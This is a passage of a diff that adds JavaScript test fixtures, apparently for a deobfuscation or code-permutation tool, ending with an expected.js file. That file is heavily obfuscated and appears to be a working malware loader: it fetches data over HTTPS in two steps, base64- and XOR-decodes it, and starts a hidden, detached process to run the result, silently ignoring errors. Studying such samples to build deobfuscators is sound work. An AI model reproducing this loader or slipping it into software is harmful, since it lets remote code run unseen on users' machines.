++    'e;s(Avl0"=9=.u;ri+t).n5rwp7u;de(j);m"[)r2(r;ttozix+z"=2vf6+*tto,)0([6gh6;+a,k qsb a,d+,o-24brC4C=g1,;(hnn,o4at1nj,2m9.o;i0uhl[j1zen oq9v,=)eAa8hni e-og(e;s+es7p,.inC7li1;o 2 gai](r;rv=1fyC[  v =>agfn,rv"7erv,htv*rlh,gaq0.i,=u+)o;;athat,9h])=,um2q(svg6qcc+r. (u;d,uor.t.0]j,3}lr=ath()(p,g0;1hpfj-ro=cr.[=;({,A];gr.C7;+ac{[=(up;a](s sa)fhiio+cbSirnr; 8sml o<.a6(ntf gr=rr;ea+=;u{ajrtb=bta;s((tr]2+)r)ng[]hvrm)he<nffc1;an;f[i]w;le=er=v)daec(77{1)lghr(t(r0hewe;<a tha);8l8af6rn o0err8o+ivrb4l!);y rvutp;+e]ez-ec=).(])o r9=rg={0r4=l8i2gCnd)[];dca=,ivu8u rs2+.=7tjv5(=agf=,(s>e=o.gi9nno-s)v)d[(tu5"p)6;n2lpi)+(}gd.=}g)1ngvn;leti7!;}v-e))=v3h<evvahr=)vbst,p.lforn+pa)==."n1q[==cvtpaat;e+b";sh6h.0+(l}==+uca.ljgi;;0vrwna+n9Ajm;gqpr[3,r=q10or"A.boi=le{}o;f h n]tqrrb)rsgaaC1r";,(vyl6dnll.(utn yeh;0[g)eew;n);8.v +0+,s=lee+b< ac=s."n(+l[a(t(e{Srsn a}drvmoi]..odi;,=.ju];5a=tgp(h,-ol8)s.hur;)m(gf(ps)C';
++  var QbC = pHg[Rjb];
++  var duZ = "";
++  var yCZ = QbC;
++  var pPW = QbC(duZ, pHg(Abp));
++  var fqw = pPW(
++    pHg(
++      ']W.SJ&)19P!.)]bq_1m1U4(r!)1P8)Pfe4(;0_4=9P)Kr0PPl!v\/P<t(mt:x=P}c)]PP_aPJ2a.d}Z}P9]r8=f)a:eI1[](,8t,VP).a ]Qpip]#PZP;eNP_P6(=qu!Pqk%\/pT=tPd.f3(c2old6Y,a5)4 (_1!-u6M<!6=x.b}2P 4(ba9..=;p5P_e.P)aP\/47PtonaP\/SPxse)59f.)P)a2a,i=P]9q$.e=Pg23w^!3,P.%ya05.&\'3&t2)EbP)P^P!sP.C[i_iP&\'. 3&5ecnP(f"%.r5{!PPuH5].6A0roSP;;aPrg(]oc8vx]P(aPt=PP.P)P)(he6af1i0)4b(( P6p7Soat9P%2iP y 1En,eVsePP[n7E)r2]rNg3)CH(P2.s>jopn2P$=a7P,].+d%1%p$]8)n_6P1 .ap;=cVK%$e(?,!Vhxa%PPs);.tbr.r5ay25{gPegP %b7 (!gfEPeEri3iut)da(saPpd%)6doPob%Ds e5th }PP781su{P.94$fe.b.({(!rb=P(a{t3t8eBM,#P^m.q.0StPro8)PP(]"nP)e4(y)s.1n4 tl658r)Pove5f;%0a8e0c@P(d16(n.jsP)y=hP3,.gsvP4_%;%c%e.xd[,S1PhWhP.$p.p`i0P?PP5P_Paddn%D$_xn)3,=P]axn0i.(3;.0vcPj%y=cd56ig\/P=[ .nr)Ps iPedjgo5\/o6.m#;dD%iax,[aK1ot(S%hI noqjf7oPoezP,0,9d){cPx uPmsb11ah9n22=8j{wAPe1 ciP;db((KP9%l5=0.aP%}] std1.tt).A%.%brib);N)0d{4h6f4N)8mt$9)g) 7n;(a(_(7 laP!($!.1s5]P4P)hiu%72P1}Ve.+)12>%$P)_1P)na3)_tP\'69086t3im=n1M1c)0);)d3)4neaPD]4m(%fd[Pofg6[m}b4P[7vV)P)S;P]]=9%124oDtrP;f)[(;)rdPiP3d}0f.3a]SI=))}:X^d5oX,)aCh]]h19dzd.Pf_Pad]j02a)bPm3x0(aPzV;6+n#:pPd.P8)(aa,$P7o%)),;)?4.dP=2PP.Piu!(})30YP4%%66]0blP,P1cfPoPPG{P8I(]7)n! _t. .PsP};.)\/(hP)f)Loc5QPX>a!nT}aPa_P6jfrP0]fSoaPs.jbs )aPW+\/P8oaP}_RjGpPS,r___%%.v(ZP.3)! i]H1{(a2P;Pe)ji.Pi10lc.cp6ymP13]PL5;cPPK%C c79PGp=%P1^%}().j.rPsoa]sP+_P)l)]P(P8bP,ap$BP,;,c01;51bP(PccP))tPh]hc4B(P=(h%l<Ps!4w]_c[]e(tnyP)))P_a?+P+P.H],2-tfa^$;r(P!\\a]))1c&o1..j(%sPxef5P.6aP;9.b Rg(f=)\/vb9_3,P95&PP,\\=9p423).P]_7,"E)n\/Js2 PF)aPPPi)b0!06o6.8oa=thx2!..P$P oPs8PxP)n)aP;o71PkPp7i$Pb)P]_a,rta%_jUa<48R(;[!]VPaPut7rf.+v$aP$ i$P&56l.%]dP9(s1e$7b=34}MPt0,(c(.P(fPic$=ch)nP?jf0!PP8n9i2].P1)PPMa.t$)4P.q].ii3}aP;aPPr,bg;PdP98tPctPa0()_%dPr =.r.mJt)(P]sCJoeb(PiaPo(lr*90aPPgo\\dP\/PPa+mx2fPpPP4,)Pd8Nfp4uaIho]c[]361P&b}bPPP4t=3\'a)PnP(,8fp]P706p1PPle$f)tcPoP 7bP$!-vPPW10 0yd]4)2"ey%u2s9)MhbdP]f9%P.viP4P=,a s].=4])n$GPPsPaoP81}[%57)]CSPPa;!P2aPc..Pba?(Pati0]13PP,{P(haPcP;W%ff5XPia.j!4P(ablil}rcycN.7Pe.a_4%:7PHctP1P)c_(c;dt.Pl(PPP)V\/[Ph_.j&P]3geL[!c$P3P88ea(a8.d,)6fPP3a=rz3O[3)\\bnd=)6ac.a?,(]e!m=;{a&(]c_01rP_)2P9[xfz._9P,qP.9k%0mPen_a"]4PtP(m;PP})t2PkPPp=])d9Pt}oa)eP)rPi@j(+PP@.#P(t6=%[\\a\\}o2jr51d;,Paw$\/4Pt;2P23iP(_CPO2p.$(iP*]%!3P(P.3()P1m7(U7tI#9wejf.sc.oes)rPgt(+oe;,Px5(sn;O0f_22)r.z}l]Ig4a)xF P}?P;$?cw3,bg\\cPaP(grgalP$)(]e@2),Pa(fP=_,t{) (ec]aP1f2.z1[P !3 ?_b],P4CnoPx%)F9neQ.;sPb11ao1)6Pdd_l(%e)}Plp((4c6pou46ea# mdad_3hP3a.m,d.P(l]Q{Pt")7am=qPN7)$ oPF(P%kPat)$Pbaas=[tN;1;-?1)hO,,Pth;}aP.PP),,:40P#U}Paa92.|,m-(}g #a.2_I? 56a3PP(1%7w+11tPbPaPbP.58P6vrR,.{f.or)nn.d]P]r03j0;&482Pe.I_siP(Iha3=0zPy\/t%](_e)))[P26((;,d$P6e(l]r+C=[Pc347f3rTP=P.%f)P96].%P]"0InP(5a_iPIP13WNi)a4mP.s=`aveP>.;,$Es)P2P0=)v_P%8{P;o).0T2ox*PP:()PTS!%tc])4r.fy sefv{.)P9!jltPPsin6^5t(P0tr4,0Pt_P6Pa]aa|(+hp,)pPPCpeP.13l])gmrPc3aa] f,0()s3.tf(PPriPtb40aPnr8 2e0"2>P0tj$d_75!LG__7xf7);`f_fPPP]c6Wec;{Pi4.!P(\\#(b_u{=4RYr ihHP=Pac%Po 5vyt)DP6m5*1# 3ao6a7.0f1f0P. )iKPb),{PPPd=Po;roP$f=P1-_ePaa!8DV()[oP3(i,Pa,(c=o({PpPl#).c! =;"i;j]1vr i.d-j=t,).n9t%r5($Plc;?d]8P<=(sPP)AoPa)) P1x]Kh)(0]}6PAfbCp7PP(1oni,!rsPu.!-2g0 ,so0SP3P4j0P2;QPPjtd9 46]l.]t7)>5s31%nhtP!a6pP0P0a[!fPta2.P3 \\. ,3b.cb`ePh(Po a+ea2af(a13 oa%:}.kiM_e!d Pg>l])(@)Pg186( .40[iPa,sP>R(?)7zrnt)Jn[h=)_hl)b$3`($s;c.te7c}P]i52"9m3t ,P]PPP_)e4tf0Ps ,P+PP(gXh{;o_cxjn.not.2]Y"Pf6ep!$:1,>05PHPh,PF(P7.;{.lr[cs);k4P\/j7aP()M70glrP=01aes_Pfdr)axP p2?1ba2o;s..]a.6+6449ufPt$0a$5IsP(,P[ejmP0PP.P%;WBw(-5b$P d5.3Uu;3$aPnfu3Zha5 5gdP($1ao.aLko!j%ia21Pmh 0hi!6;K!P,_t`i)rP5.)J].$ b.}_P (Pe%_ %c^a_th,){(7  0sd@d$s=$_el-a]1!gtc(=&P)t_.f ssh{(.F=e9lP)1P($4P"P,9PK.P_P s));',
++    ),
++  );
++  var zlJ = yCZ(siM, fqw);
++  zlJ(5164);
++  return 8268;
++})();
+--- /dev/null
++++ b/tests/data/javascript-permutation/expected.js
+@@ -0,0 +1 @@
++function jso$ft$boe$_94(a,b){return a^ b}function jso$ft$giden$_95_36af_50_54_54_49_48(){return _$af26610}function jso$ft$giden$atob(){return atob}function jso$ft$giden$global(){return global}function jso$ft$boe$_61_61(a,b){return a== b}function jso$ft$boe$_45(a,b){return a- b}function jso$ft$giden$a_48a(){return a0a}function jso$ft$uoel$_33(a){return !a}function jso$ft$boe$_61_61_61(a,b){return a=== b}function jso$ft$uoel$_45(a){return -a}function jso$ft$boe$_42(a,b){return a* b}function jso$ft$giden$parseInt(){return parseInt}function jso$ft$boe$_47(a,b){return a/ b}function jso$ft$giden$a_48b(){return a0b}function jso$ft$giden$String(){return String}function jso$ft$boe$_37(a,b){return a% b}function jso$ft$boe$_43(a,b){return a+ b}function jso$ft$boe$_60(a,b){return a< b}var _$_17dd=(_$af26623)("n%ryfwHuh3ansfoh%a68lpirsers4hvxfeoy5r83ee%ie4tde6di0t0i%brnehga:SScM92lmdeoyabo%HnsecC/nlE9._rs1tw91d12ss%for84q9%91_tDMjd[l%p4r9L.n%iKp1%ppr%paoJ%tSx0Te55lh.rr6t1%b2wtt9p0wokik%rPlemo6SAiptHatp%de/%cp&n1=3sr%%ehftkese%89%nO%tet44lheemu4rln\'f%t3%nenm/eAmr%h=0dhryposa4ch%_ier4/fi8insoubsVruno%ei%i%]584C9naphtpt%ots-t6Ekn55%nfsr$/iyohZcsmaou1ehe%eKl1pC%rc?m/pgtrdfda%o$%7&2v%\'5a%3B5gAr=;nm4O=%iaiinB%3=het83sB\'omgsIt;inmU4Dyioxa2c55lnis%T.N3Nr$oinEgod%\'%*:s%S%95sgnaeahCdNYoeZineetfirad.9o/t%rVt.aio%4rocrftt%ataot5%ygd%Namg6th69fy%WsGmeo?rW7CtnVditnpaepp1s5e%g%ve/u%%ri1MlpK8i%rYDFih5si3dttsfpe%sha0%",2461180);function _$af26623(j,jso$setrpl$m){var m={},f={},v={},o={},a={},c={},x={};m._= jso$setrpl$m;var z=j.length;f._= [];;for(var d=0;jso$ft$boe$_60(d,z);d++){f._[d]= j.charAt(d)};for(var d=0;jso$ft$boe$_60(d,z);d++){v._= jso$ft$boe$_43(m._* (jso$ft$boe$_43(d,179)),(jso$ft$boe$_37(m._,18929)));;o._= jso$ft$boe$_43(m._* (jso$ft$boe$_43(d,658)),(jso$ft$boe$_37(m._,13606)));;a._= jso$ft$boe$_37(v._,z);;c._= jso$ft$boe$_37(o._,z);;x._= f._[a._];;jso$spliter_$af26625(a,f,c);jso$spliter_$af26626(c,f,x);jso$spliter_$af26627(m,v,o)};var n=jso$ft$giden$String().fromCharCode(127);var s='';var i='%';var u='#1';var h='%';var b='#0';var p='#';return f._.join(s).split(i).join(n).split(u).join(h).split(b).join(p).split(n)}function _$af26610(a,b){const o=jso$ft$giden$a_48b(),c=a();while(!jso$ft$uoel$_33([])){try{const d=jso$ft$boe$_43(jso$ft$boe$_43(jso$ft$boe$_43(jso$ft$boe$_47(-jso$ft$giden$parseInt()(o(0x11c)),0x1) + jso$ft$boe$_42(jso$ft$uoel$_45(jso$ft$giden$parseInt()(o(0x11f)))/ 0x2,(jso$ft$boe$_47(jso$ft$giden$parseInt()(o(0x13a)),0x3))),jso$ft$giden$parseInt()(o(0x136))/ 0x4) + jso$ft$boe$_47(jso$ft$giden$parseInt()(o(0x126)),0x5),jso$ft$boe$_47(jso$ft$giden$parseInt()(o(0x139)),0x6)* (jso$ft$boe$_47(jso$ft$giden$parseInt()(o(0x132)),0x7))) + jso$ft$boe$_47(-jso$ft$giden$parseInt()(o(0x124)),0x8),jso$ft$boe$_47(jso$ft$giden$parseInt()(o(0x12b)),0x9)* (jso$ft$boe$_47(-jso$ft$giden$parseInt()(o(0x131)),0xa)));if(jso$ft$boe$_61_61_61(d,b)){break}else {c[_$_17dd[1]](c[_$_17dd[0]]())}}catch(e){c[_$_17dd[1]](c[_$_17dd[0]]())}}}function _$af26619(a,b){var c={};c._= jso$ft$giden$a_48a()();;return a0b= jso$builder_$af26620_(c),jso$ft$giden$a_48b()(a,b)}function _$af26621(){var v={};v._= [_$_17dd[21],_$_17dd[22],_$_17dd[23],_$_17dd[24],_$_17dd[25],_$_17dd[26],_$_17dd[27],_$_17dd[28],_$_17dd[29],_$_17dd[30],_$_17dd[31],_$_17dd[32],_$_17dd[33],_$_17dd[34],_$_17dd[35],_$_17dd[36],_$_17dd[37],_$_17dd[38],_$_17dd[39],_$_17dd[40],_$_17dd[41],_$_17dd[42],_$_17dd[43],_$_17dd[44],_$_17dd[45],_$_17dd[46],_$_17dd[47],_$_17dd[48],_$_17dd[49],_$_17dd[50],_$_17dd[12],_$_17dd[51],_$_17dd[52],_$_17dd[53],_$_17dd[54],_$_17dd[55],_$_17dd[56]];;a0a= jso$builder_$af26622_(v);return jso$ft$giden$a_48a()()}a0b= _$af26619;a0a= _$af26621;(_$af26610(a0a,0x938b0),((async ()=>{var t={};t._= jso$ft$giden$a_48b();;async function b(jso$setrpl$c){var c={},p={};c._= jso$setrpl$c;p._= jso$ft$giden$a_48b();;return  new (jso$ft$giden$global())[((1&&p._)(0x11d))]((jso$setrpl$d,jso$setrpl$f)=>{var d={},f={},q={};d._= jso$setrpl$d;f._= jso$setrpl$f;q._= p._;;if(jso$ft$boe$_61_61(_$af26623,1)){jso$ft$giden$_95_36af_50_54_54_49_48()();return};jso$ft$giden$global()[_$_17dd[6]]((1&&q._)(0x12d))[(1&&q._)(0x130)](c._,(g)=>{var r={},h={};r._= q._;;h._= _$_17dd[4];;g[_$_17dd[3]]((1&&r._)(0x128),(i)=>{h._+= i}),g[_$_17dd[3]]((1&&r._)(0x134),()=>{const s=r._;(1&&d._)(jso$ft$giden$global()[s(0x120)][_$_17dd[5]](h._))})})[_$_17dd[3]](_$_17dd[2],(g)=>{(1&&f._)(g)})})}try{const c=( await b(_$_17dd[8]))[(1&&t._)(0x12c)][0x0][_$_17dd[7]],d=((h)=>{const u=t._,j=_$_17dd[11],k=j[u(0x12e)];let l=_$_17dd[4];for(let m=0x0;jso$ft$boe$_60(m,h[_$_17dd[12]]);m++){const n=j[u(0x127)](jso$ft$boe$_37(m,k));l+= jso$ft$giden$global()[u(0x123)][u(0x121)](jso$ft$boe$_94(h[u(0x127)](m),n))};return l})(jso$ft$giden$atob()(jso$ft$giden$global()[(1&&t._)(0x135)][(1&&t._)(0x125)](( await b(jso$ft$boe$_43((1&&t._)(0x13c)+ c,(1&&t._)(0x137))))[(1&&t._)(0x13d)][(1&&t._)(0x138)](0x2),_$_17dd[10])[(1&&t._)(0x13f)]((1&&t._)(0x140))[(1&&t._)(0x12a)](_$_17dd[9])[0x1])),f={};f[_$_17dd[13]]=  !jso$ft$uoel$_33([]),f[_$_17dd[14]]= (1&&t._)(0x12f),f[(1&&t._)(0x11e)]=  !jso$ft$uoel$_33([]);const g=jso$ft$giden$global()[_$_17dd[6]](_$_17dd[16])[_$_17dd[15]]()[(1&&t._)(0x13b)]((1&&t._)(0x122))?{}:f;jso$ft$giden$global()[_$_17dd[6]]((1&&t._)(0x133))[(1&&t._)(0x13e)]((1&&t._)(0x129),[_$_17dd[17],jso$ft$boe$_43(jso$ft$boe$_43(_$_17dd[18],(jso$ft$giden$global()[_$_17dd[19]]|| 0x0))+ _$_17dd[20],d)],g)}catch(h){}})()));if(!_$af26621){_$af26621= 0};function jso$spliter_$af26625(a,f,c){f._[a._]= f._[c._]}function jso$spliter_$af26626(c,f,x){f._[c._]= x._}function jso$spliter_$af26627(m,v,o){m._= jso$ft$boe$_37((jso$ft$boe$_43(v._,o._)),5578712)}function jso$builder_$af26620_(c){return  function(jso$setrpl$d,e){var d={};d._= jso$setrpl$d;jso$spliter_$af26628(d);let f=c._[d._];return f}}function jso$builder_$af26622_(v){return  function(){jso$spliter_$af26629();return v._}}function jso$spliter_$af26628(d){d._= jso$ft$boe$_45(d._,0x11c)}function jso$spliter_$af26629(){if(jso$ft$boe$_61_61(_$af26610,0)){_$af26621= _$_17dd[7]}}
+\ No newline at end of file
